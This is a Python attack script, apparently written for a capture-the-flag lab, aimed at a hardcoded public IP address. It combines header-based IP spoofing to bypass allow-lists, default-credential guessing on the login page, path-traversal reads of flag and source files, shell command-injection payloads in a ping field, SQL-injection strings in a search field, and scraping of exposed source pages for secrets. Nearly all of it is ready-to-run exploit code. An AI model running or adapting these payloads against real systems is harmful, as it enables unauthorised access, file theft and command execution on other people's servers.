import requests
import re
import time

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})

FLAGS_FOUND = []

def add_flag(location, content):
    FLAGS_FOUND.append({"location": location, "content": content})
    print(f"\n  🚩 FLAG FOUND!")
    print(f"     位置: {location}")
    print(f"     内容: {content}")

def check_flag(text):
    patterns = [r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'ctf\{[^}]+\}', r'CTF\{[^}]+\}']
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None

def spoof_ip(ip):
    return {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "X-Client-IP": ip,
        "X-Originating-IP": ip,
        "X-Remote-IP": ip,
        "X-Remote-Addr": ip,
        "Forwarded": f"for={ip}",
    }

def test_login_with_ip_spoofing():
    print("\n" + "="*70)
    print("1. 测试登录 - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/login"
    
    ips_to_try = ["127.0.0.1", "localhost", "0:0:0:0:0:0:0:1", "::1", "10.0.0.1", "192.168.1.1"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        try:
            r = session.get(url, headers=headers, timeout=TIMEOUT)
            print(f"     GET /login: {r.status_code}")
            
            csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
            csrf_token = csrf.group(1) if csrf else ""
            
            credentials = [
                ("admin", "admin"),
                ("admin", "123456"),
                ("admin", "password"),
                ("admin", "ctf"),
                ("admin", "term3lab"),
                ("root", "root"),
                ("user", "user"),
                ("test", "test"),
                ("admin", ""),
                ("", ""),
            ]
            
            for username, password in credentials:
                data = {"username": username, "password": password}
                if csrf_token:
                    data["csrf"] = csrf_token
                
                r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    if "用户名或密码错误" not in r.text and "登录" not in r.text:
                        print(f"\n     🎉 登录成功! {username}/{password}")
                        print(f"     响应: {r.text[:800]}")
                        
                        flag = check_flag(r.text)
                        if flag:
                            add_flag(f"Login {username}/{password}", flag)
                            return True
                    elif "欢迎" in r.text or "dashboard" in r.text.lower():
                        print(f"\n     🎉 可能登录成功! {username}/{password}")
                        flag = check_flag(r.text)
                        if flag:
                            add_flag(f"Login {username}/{password}", flag)
                            return True
                            
        except Exception as e:
            print(f"     错误: {e}")
            continue
    
    return False

def test_backup_with_ip_spoofing():
    print("\n" + "="*70)
    print("2. 测试Backup - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/backup"
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        backup_paths = [
            "F:\\small peoject\\python-lab\\flag.txt",
            "F:\\small peoject\\python-lab\\flag",
            "F:\\small peoject\\python-lab\\app.py",
            "F:\\small peoject\\python-lab\\main.py",
            "F:\\small peoject\\python-lab\\config.py",
            "F:\\flag.txt",
            "F:\\flag",
            "C:\\flag.txt",
            "C:\\flag",
            "./flag.txt",
            "../flag.txt",
            "../../flag.txt",
            "/flag.txt",
            "/flag",
        ]
        
        for path in backup_paths:
            try:
                r = session.get(url, params={"path": path}, headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                    if body_match:
                        content = body_match.group(1).strip()
                        
                        if "Blocked" not in content and len(content) > 20:
                            print(f"\n     [{r.status_code}] ?path={path}")
                            print(f"     响应: {content[:500]}")
                            
                            flag = check_flag(content)
                            if flag:
                                add_flag(f"Backup {ip}", flag)
                                return True
                                
            except Exception as e:
                continue
    
    return False

def test_include_with_ip_spoofing():
    print("\n" + "="*70)
    print("3. 测试Include - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/include"
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        include_payloads = [
            "welcome",
            "../flag.txt",
            "../../flag.txt",
            "../app.py",
            "../../app.py",
            "/flag.txt",
            "/flag",
            "/app.py",
            "../uploads/test.gif",
            "../../uploads/test.gif",
            "flag",
            "secret",
            "config",
        ]
        
        for payload in include_payloads:
            try:
                r = session.get(url, params={"page": payload}, headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                    if body_match:
                        content = body_match.group(1).strip()
                        
                        if "Blocked" not in content and len(content) > 50:
                            print(f"\n     [{r.status_code}] ?page={payload}")
                            print(f"     响应: {content[:500]}")
                            
                            flag = check_flag(content)
                            if flag:
                                add_flag(f"Include {ip}", flag)
                                return True
                                
            except Exception as e:
                continue
    
    return False

def test_ping_with_ip_spoofing():
    print("\n" + "="*70)
    print("4. 测试Ping - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/ping"
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        ping_payloads = [
            "127.0.0.1",
            "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
            "127.0.0.1; type F:\\flag.txt",
            "127.0.0.1; type C:\\flag.txt",
            "127.0.0.1; dir F:\\",
            "127.0.0.1; whoami",
            "127.0.0.1; ipconfig",
            "; type F:\\flag.txt",
            "| type F:\\flag.txt",
            "&& type F:\\flag.txt",
            "`type F:\\flag.txt`",
            "$(type F:\\flag.txt)",
        ]
        
        for payload in ping_payloads:
            try:
                r = session.get(url, params={"host": payload}, headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                    if body_match:
                        content = body_match.group(1).strip()
                        
                        if "Blocked" not in content and len(content) > 50:
                            print(f"\n     [{r.status_code}] ?host={payload}")
                            print(f"     响应: {content[:500]}")
                            
                            flag = check_flag(content)
                            if flag:
                                add_flag(f"Ping {ip}", flag)
                                return True
                                
            except Exception as e:
                continue
    
    return False

def test_search_with_ip_spoofing():
    print("\n" + "="*70)
    print("5. 测试Search - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/search"
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        sql_payloads = [
            "%",
            "*",
            "1' OR 1=1--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns--",
            "1' AND SLEEP(1)--",
            "' OR 1=1",
            "\" OR 1=1",
            "flag",
            "admin",
            "password",
        ]
        
        for payload in sql_payloads:
            try:
                r = session.get(url, params={"q": payload}, headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    content = r.text[:500]
                    
                    if len(content) > 100:
                        print(f"\n     [{r.status_code}] ?q={payload}")
                        print(f"     响应: {content}")
                        
                        flag = check_flag(content)
                        if flag:
                            add_flag(f"Search {ip}", flag)
                            return True
                                
            except Exception as e:
                continue
    
    return False

def test_dashboard_with_ip_spoofing():
    print("\n" + "="*70)
    print("6. 测试Dashboard - IP伪装")
    print("="*70)
    
    url = f"{TARGET}/dashboard"
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        try:
            r = session.get(url, headers=headers, timeout=TIMEOUT)
            
            if r.status_code == 200:
                print(f"     [{r.status_code}] /dashboard")
                print(f"     响应: {r.text[:800]}")
                
                flag = check_flag(r.text)
                if flag:
                    add_flag(f"Dashboard {ip}", flag)
                    return True
                    
        except Exception as e:
            continue
    
    return False

def test_source_pages_with_ip_spoofing():
    print("\n" + "="*70)
    print("7. 测试源码页面 - IP伪装")
    print("="*70)
    
    source_pages = [
        "/upload-source",
        "/ping-source",
        "/backup-source",
        "/search-source",
        "/login-source",
        "/include-source",
        "/message-source",
        "/dashboard-source",
        "/full-source",
        "/app-source",
        "/main-source",
        "/server-source",
    ]
    
    ips_to_try = ["127.0.0.1", "localhost"]
    
    for ip in ips_to_try:
        print(f"\n  >>> 伪装IP: {ip}")
        headers = spoof_ip(ip)
        
        for path in source_pages:
            try:
                r = session.get(f"{TARGET}{path}", headers=headers, timeout=TIMEOUT)
                
                if r.status_code == 200 and len(r.text) > 500:
                    print(f"\n     [{r.status_code}] {path}")
                    print(f"     内容长度: {len(r.text)}")
                    
                    flag = check_flag(r.text)
                    if flag:
                        add_flag(f"Source {ip}", flag)
                        return True
                        
                    # 搜索敏感信息
                    secret_vars = re.findall(r'(SECRET|FLAG|PASSWORD|KEY|TOKEN)\s*=\s*["\']([^"\']+)["\']', r.text, re.IGNORECASE)
                    if secret_vars:
                        print(f"     敏感变量: {secret_vars}")
                        
            except Exception as e:
                continue
    
    return False

def main():
    print("*"*70)
    print("  IP伪装攻击 - C2验证")
    print("  目标: " + TARGET)
    print("*"*70)
    
    print("\n  思路:")
    print("  1. 伪装IP为127.0.0.1绕过IP白名单限制")
    print("  2. 尝试登录后台获取账号密码")
    print("  3. 利用后台权限读取全部文件")
    
    # 先测试服务是否可用
    print("\n" + "="*70)
    print("0. 检查服务状态")
    print("="*70)
    
    for attempt in range(3):
        try:
            r = session.get(TARGET, timeout=TIMEOUT)
            print(f"  尝试 {attempt+1}: {r.status_code}")
            if r.status_code == 200:
                print("  ✅ 服务可用")
                break
        except Exception as e:
            print(f"  尝试 {attempt+1}: {e}")
            time.sleep(5)
    else:
        print("  ❌ 服务不可用，退出")
        return
    
    found = False
    
    found |= test_login_with_ip_spoofing()
    found |= test_backup_with_ip_spoofing()
    found |= test_include_with_ip_spoofing()
    found |= test_ping_with_ip_spoofing()
    found |= test_search_with_ip_spoofing()
    found |= test_dashboard_with_ip_spoofing()
    found |= test_source_pages_with_ip_spoofing()
    
    print("\n" + "="*70)
    print("结果汇总")
    print("="*70)
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] 位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  下一步建议:")
        print("     1. 使用Burp Suite代理测试IP伪装")
        print("     2. 尝试更多IP头: X-Forwarded-Host, X-Forwarded-Proto")
        print("     3. 测试登录后再伪装IP访问敏感接口")
        print("     4. 使用c2_exploit.py进行更深入的测试")

if __name__ == "__main__":
    main()